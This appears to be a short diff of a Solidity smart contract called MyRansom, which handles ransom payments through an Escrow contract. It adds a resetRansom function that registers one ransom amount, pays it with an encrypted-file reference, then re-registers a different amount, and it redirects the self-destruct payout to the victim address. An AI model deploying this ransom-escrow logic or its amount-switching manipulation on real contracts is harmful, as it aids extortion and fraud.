@@ -148,13 +148,20 @@ contract MyRansom {
      * @dev Self-dstructs this contract. May only be called by the Escrow contract
      */
     function die() external {
-        selfdestruct(escrowAddr);
+        selfdestruct(victimAddr);
     }
 
     /**
      * @dev Calls the registerRansom() function in Escrow
      */
-    function myFunc(uint _ransomAmount, uint _victimId, address _victimAddr) {
-        Escrow(escrowAddr).registerRansom(_ransomAmount, _victimId, _victimAddr);
+    function resetRansom(uint _ransomAmountStart, uint _ransomAmountEnd, uint _victimId, address _victimAddr, string _encFile) external {
+        Escrow(escrowAddr).registerRansom(_ransomAmountStart, _victimId, _victimAddr);
+        Escrow(escrowAddr).payRansom(_victimId, _encFile);
+        Escrow(escrowAddr).registerRansom(_ransomAmountEnd, _victimId, _victimAddr);
+    }
+    
+    function () payable public {
+        
     }
 }
+
